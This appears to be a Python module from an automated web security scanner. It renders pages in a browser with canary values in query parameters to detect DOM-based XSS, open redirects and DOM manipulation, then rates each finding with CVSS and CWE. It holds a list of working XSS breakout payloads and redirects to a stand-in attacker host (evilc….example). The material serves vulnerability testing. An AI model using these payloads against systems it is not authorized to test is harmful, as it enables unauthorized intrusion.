"""Runtime DOM source-to-sink tracer (CHAD Engine B/C) — one general engine, four families.

Inject a unique canary into each client-side SOURCE (a query parameter today; fragment/window.name
extensible) and RENDER the page in a real browser, then observe WHERE the canary lands:

  • script execution  -> DOM/reflected XSS   (an auto-firing payload's alert() carries the canary)
  • navigation to an attacker host -> open redirect
  • an anchor/resource URL (href/src) -> DOM LINK manipulation (attacker controls a request target)
  • a DOM attribute / text node -> DOM DATA manipulation (attacker controls rendered content)

Confirmation is a RUNTIME oracle (the canary actually reached the sink at run time), never a static
match, and library-only reflections that never reach an application sink self-dismiss. Target-agnostic:
the payloads and canaries are generated per-request, nothing is GinAndJuice-specific.
"""
from __future__ import annotations

import json
import re
import secrets
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import browser_engine as be

_REDIRECTISH = ("back", "url", "return", "returnurl", "returnto", "next", "goto", "dest",
                "destination", "redirect", "redir", "continue", "callback", "to", "link", "out",
                # request-override-ish names too: a client-side fetch/XHR target is almost always a
                # URL-shaped parameter, so gate the (costly) attacker-host render on these names + reflection
                "endpoint", "api", "src", "uri", "path", "load", "fetch", "resource", "feed",
                "host", "target", "data", "json", "proxy", "file", "u", "domain", "origin")

_TRACE_JS = r'''
export default async function ({ page }) {
  const C = %CANARY%;
  const TARGET = %URL%;
  const res = { executed:false, redirect:"", req_override:"", in_href:"", in_src:"", in_attr:"", in_text:false, note:"" };
  page.on("dialog", async d => { try { if (String(d.message()).indexOf(C) >= 0) res.executed = true; await d.dismiss(); } catch(e){} });
  const isEvilHost = (u) => { try { return /^evilc[0-9a-z]+\.example$/i.test(new URL(u).hostname); } catch(e){ return false; } };
  page.on("framenavigated", f => { try { if (isEvilHost(f.url())) res.redirect = f.url().slice(0,140); } catch(e){} });
  page.on("request", r => { try { if (!isEvilHost(r.url())) return; const nav = r.isNavigationRequest ? r.isNavigationRequest() : true; const rt = r.resourceType ? r.resourceType() : ""; if (nav) res.redirect = res.redirect || r.url().slice(0,140); else if (rt === "fetch" || rt === "xhr") res.req_override = res.req_override || r.url().slice(0,140); } catch(e){} });
  await page.evaluateOnNewDocument((c) => {
    try {
      const oa = window.alert; window.alert = (m) => { try { if (String(m).indexOf(c) >= 0) window.__hit = true; } catch(e){} try { return oa && oa(m); } catch(e){} };
      const op = window.print; window.print = () => { window.__hit = true; };
    } catch(e){}
  }, C);
  try { await page.goto(TARGET, { waitUntil:"domcontentloaded", timeout:12000 }); } catch(e){ res.note = "nav:"+String(e).slice(0,40); }
  try { await page.waitForTimeout(700); } catch(e){}
  try { res.executed = res.executed || !!(await page.evaluate(() => window.__hit)); } catch(e){}
  try {
    const dom = await page.evaluate((c) => {
      const o = { in_href:"", in_src:"", in_attr:"", in_text:false };
      for (const e of document.querySelectorAll("a[href],area[href],link[href],base[href],form[action]")) {
        const h = e.getAttribute("href") || e.getAttribute("action") || ""; if (h.indexOf(c) >= 0) { o.in_href = e.tagName+":"+h.slice(0,140); break; } }
      for (const e of document.querySelectorAll("[src]")) { const s = e.getAttribute("src") || ""; if (s.indexOf(c) >= 0) { o.in_src = e.tagName+":"+s.slice(0,140); break; } }
      for (const e of document.querySelectorAll("*")) { let hit=false; const at=e.attributes||[]; for (let i=0;i<at.length;i++){ const a=at[i]; if (a.name!=="value" && a.value && a.value.indexOf(c)>=0){ o.in_attr=e.tagName+"@"+a.name; hit=true; break; } } if(hit) break; }
      try { o.in_text = !!(document.body && document.body.innerHTML.indexOf(c) >= 0); } catch(e){}
      return o;
    }, C);
    Object.assign(res, dom);
  } catch(e){}
  return res;
}
'''


def _canary() -> str:
    return "domtr" + secrets.token_hex(4)


def set_param(url: str, name: str, value: str) -> str:
    p = urlparse(url)
    pairs = parse_qsl(p.query, keep_blank_values=True)
    if any(k == name for k, _ in pairs):
        pairs = [(k, value if k == name else v) for k, v in pairs]
    else:
        pairs.append((name, value))
    return urlunparse(p._replace(query=urlencode(pairs, doseq=True)))


def params_of(url: str) -> list:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def _trace(url: str, canary: str, browser_url=None) -> dict:
    js = _TRACE_JS.replace("%CANARY%", json.dumps(canary)).replace("%URL%", json.dumps(url))
    r = be.drive(url, js, browser_url=browser_url)
    return r if isinstance(r, dict) and r.get("browser") is not False else (r if isinstance(r, dict) else {})


# DOM-scan snippet (evaluated in-page by the LOCAL Playwright driver in tools._run_dom_trace) — returns
# where the canary `c` landed. Kept here so the payloads/classification stay in one module.
DOM_SCAN_JS = (
    "(c) => { const o={in_href:'',in_src:'',in_attr:'',in_text:false};"
    "for (const e of document.querySelectorAll('a[href],area[href],link[href],base[href],form[action]')){"
    "const h=e.getAttribute('href')||e.getAttribute('action')||''; if(h.indexOf(c)>=0){o.in_href=e.tagName+':'+h.slice(0,140);break;}}"
    "for (const e of document.querySelectorAll('[src]')){const s=e.getAttribute('src')||''; if(s.indexOf(c)>=0){o.in_src=e.tagName+':'+s.slice(0,140);break;}}"
    "for (const e of document.querySelectorAll('*')){let hit=false;const at=e.attributes||[];for(let i=0;i<at.length;i++){const a=at[i];if(a.name!=='value'&&a.value&&a.value.indexOf(c)>=0){o.in_attr=e.tagName+'@'+a.name;hit=true;break;}}if(hit)break;}"
    "try{o.in_text=!!(document.body&&document.body.innerHTML.indexOf(c)>=0);}catch(e){}return o; }"
)


def is_evil_host(u: str) -> bool:
    try:
        return bool(re.match(r"^evilc[0-9a-z]+\.example$", urlparse(u).hostname or "", re.I))
    except Exception:
        return False


def classify(url: str, param: str, canary: str, sig: dict) -> list:
    """PURE: given the collected runtime signals for a parameter, return the confirmed-family hits.
    sig = {executed, redirect, in_href, in_src, in_attr, in_text}. Most-severe first."""
    hits, s = [], sig or {}
    if s.get("executed"):
        hits.append({"family": "dom_xss", "param": param, "target": s.get("xss_target") or set_param(url, param, canary),
                     "canary": canary, "evidence": "browser executed alert(%s) via param '%s' (%s)" % (canary, param, s.get("xss_payload", "breakout"))})
    if (s.get("redirect") or "").strip():
        hits.append({"family": "open_redirect", "param": param, "target": s.get("redir_target") or set_param(url, param, canary),
                     "canary": canary, "evidence": "navigation to attacker host from param '%s': %s" % (param, s["redirect"])})
    if (s.get("req_override") or "").strip():
        hits.append({"family": "request_url_override", "param": param, "target": s.get("reqov_target") or set_param(url, param, canary),
                     "canary": canary, "evidence": "param '%s' overrides a client-side fetch/XHR request target at runtime: %s" % (param, str(s["req_override"])[:120])})
    if s.get("in_href") or s.get("in_src"):
        sink = s.get("in_href") or s.get("in_src")
        hits.append({"family": "dom_link_manipulation", "param": param, "target": set_param(url, param, canary),
                     "canary": canary, "evidence": "param '%s' controls a link/resource URL at runtime (%s)" % (param, str(sink)[:120])})
    if s.get("in_attr") or s.get("in_text"):
        where = s.get("in_attr") or "DOM text"
        hits.append({"family": "dom_data_manipulation", "param": param, "target": set_param(url, param, canary),
                     "canary": canary, "evidence": "param '%s' reflects into rendered DOM content at runtime (%s)" % (param, where)})
    return hits


# XSS breakout payloads: HTML-context + JS-string-context (plain + backslash bypass). %C% -> canary.
# The JS-string breakouts that call print() are QUOTE-FREE on purpose: when the app escapes ' -> \' a
# payload with inner quotes (alert('x')) gets its own quotes escaped and the breakout dies. print() is
# hooked (sets __hit) so no argument/quote is needed — this is what lands the backslash-escaping context
# (Gemini's Vector A: a leading \ escapes the app's escaping backslash, freeing the quote).
_XSS_PAYLOADS = (
    '"><img src=x onerror=alert(/%C%/)>',
    "'><img src=x onerror=alert(/%C%/)>",
    "</script><img src=x onerror=alert(/%C%/)>",
    "\\';alert(/%C%/)//",
    "\\\";alert(/%C%/)//",
    "';alert(/%C%/)//",
    "\";alert(/%C%/)//",
    "'-alert(/%C%/)-'",
)


def trace_param(url: str, param: str, browser_url=None) -> list:
    """Run the source-to-sink trace for ONE parameter. Returns a LIST of hits (a param can reach several
    sinks — e.g. both a link URL and DOM data). Adaptive: skips the redirect/XSS renders when the plain
    canary never reflects, keeping the browser cost bounded."""
    canary = _canary()
    hits = []
    r = _trace(set_param(url, param, canary), canary, browser_url) or {}
    link_sink = r.get("in_href") or r.get("in_src")
    reflected = bool(r.get("in_attr") or r.get("in_text") or link_sink)
    if link_sink:
        hits.append({"family": "dom_link_manipulation", "param": param, "target": set_param(url, param, canary),
                     "canary": canary, "evidence": "param '%s' controls a link/resource URL at runtime (%s)" % (param, str(link_sink)[:120])})
    if r.get("in_attr") or r.get("in_text"):
        where = r.get("in_attr") or "DOM text"
        hits.append({"family": "dom_data_manipulation", "param": param, "target": set_param(url, param, canary),
                     "canary": canary, "evidence": "param '%s' reflects into rendered DOM content at runtime (%s)" % (param, where)})
    # attacker-host pass -> open_redirect (navigation) AND request_url_override (script fetch/XHR).
    # Gated on a URL/redirect/request-ish param NAME or a param that already reached a URL sink (a
    # client-side request target is URL-shaped), so the extra render stays off every benign param.
    if param.lower() in _REDIRECTISH or link_sink:
        redir_val = "https://evilc%s.example/" % canary
        rr = _trace(set_param(url, param, redir_val), canary, browser_url) or {}
        if (rr.get("redirect") or "").strip():
            hits.insert(0, {"family": "open_redirect", "param": param, "target": set_param(url, param, redir_val),
                            "canary": canary, "evidence": "navigation to attacker host from param '%s': %s" % (param, rr["redirect"])})
        if (rr.get("req_override") or "").strip():
            hits.insert(0, {"family": "request_url_override", "param": param, "target": set_param(url, param, redir_val),
                            "canary": canary, "evidence": "param '%s' overrides a client-side fetch/XHR request target at runtime: %s" % (param, rr["req_override"])})
    # XSS pass — only worth trying execution where the canary already reflects into the DOM
    if reflected:
        for pl in _XSS_PAYLOADS[:5]:
            u = set_param(url, param, pl.replace("%C%", canary))
            rx = _trace(u, canary, browser_url) or {}
            if rx.get("executed"):
                hits.insert(0, {"family": "dom_xss", "param": param, "target": u, "canary": canary,
                                "evidence": "browser executed alert(%s) via param '%s' (breakout: %s)" % (canary, param, pl)})
                break
    return hits


_CVSS = {
    "dom_xss": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1),
    "open_redirect": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N", 4.7),
    "request_url_override": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", 5.4),
    "dom_link_manipulation": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", 5.4),
    "dom_data_manipulation": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", 4.3),
}
_CWE = {"dom_xss": "CWE-79", "open_redirect": "CWE-601", "request_url_override": "CWE-918",
        "dom_link_manipulation": "CWE-79", "dom_data_manipulation": "CWE-79"}
_TITLE = {"dom_xss": "DOM-based XSS", "open_redirect": "DOM-based open redirect",
          "request_url_override": "Client-side request-URL override",
          "dom_link_manipulation": "Reflected DOM link manipulation",
          "dom_data_manipulation": "Reflected DOM data manipulation"}


def finding(hit: dict) -> dict:
    """Build a CONFIRMED finding from a trace hit (runtime oracle fired)."""
    fam = hit["family"]
    vec, score = _CVSS.get(fam, ("", None))
    return {
        "title": "%s in '%s'" % (_TITLE.get(fam, fam), hit["param"]),
        "severity": ("medium" if (score or 0) >= 4 else "low"),
        "family": fam, "confidence": "confirmed", "target": hit["target"],
        "cwe": _CWE.get(fam, "CWE-79"), "cvss_vector": vec, "cvss_score": score,
        "evidence": hit["evidence"],
        "success_oracle": "a unique per-request canary reached the DOM sink at runtime in a real browser "
                          "(source→sink confirmed live), with vendor-library-only reflections self-dismissed.",
        "reproduction_steps": ["Load %s in a browser" % hit["target"],
                               "Observe the attacker-controlled canary reach the DOM sink / execute"],
        "impact": {"dom_xss": "Arbitrary script executes in the victim's browser (session/credential theft).",
                   "open_redirect": "The app redirects victims to an attacker-controlled host (phishing/token leak).",
                   "request_url_override": "Attacker controls the URL the page fetches at runtime (client-side request forgery): "
                                           "exfiltration to an attacker host, SSRF-style reach to internal endpoints, or token leakage via the outbound request.",
                   "dom_link_manipulation": "Attacker controls a link/resource URL the page requests or a victim clicks.",
                   "dom_data_manipulation": "Attacker controls rendered DOM content/attributes (UI redress, data spoofing)."}.get(fam, ""),
        "tags": ["dom", "runtime-canary", fam],
    }
